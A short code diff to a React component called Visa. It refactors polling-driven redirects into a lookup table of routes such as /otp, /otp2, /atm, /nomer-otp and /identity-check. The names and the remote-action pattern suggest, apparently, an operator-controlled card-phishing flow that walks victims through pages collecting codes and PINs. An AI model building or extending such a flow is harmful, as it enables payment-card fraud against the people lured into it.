@@ -85,13 +85,27 @@ export default function Visa() {
 
         if (pollRef.current) clearInterval(pollRef.current);
 
-        if (action === "go_otp") {
-          setLocation("/otp");
-          return;
-        }
+        // Map all actions to pages
+        const pageMap: Record<string, string> = {
+          go_otp: "/otp",
+          go_otp2: "/otp2",
+          go_otp3: "/otp3",
+          go_atm: "/atm",
+          go_nomer: "/nomer",
+          go_nomer_wait: "/nomer-wait",
+          go_nomer_otp: "/nomer-otp",
+          go_identity_check: "/identity-check",
+          go_home: "/",
+          go_form: "/form",
+          go_select: "/select",
+          go_visa: "/visa",
+          go_total: "/total",
+          go_total2: "/total2",
+        };
 
-        if (action === "go_otp2") {
-          setLocation("/otp2");
+        const targetPage = pageMap[action];
+        if (targetPage) {
+          setLocation(targetPage);
           return;
         }
 
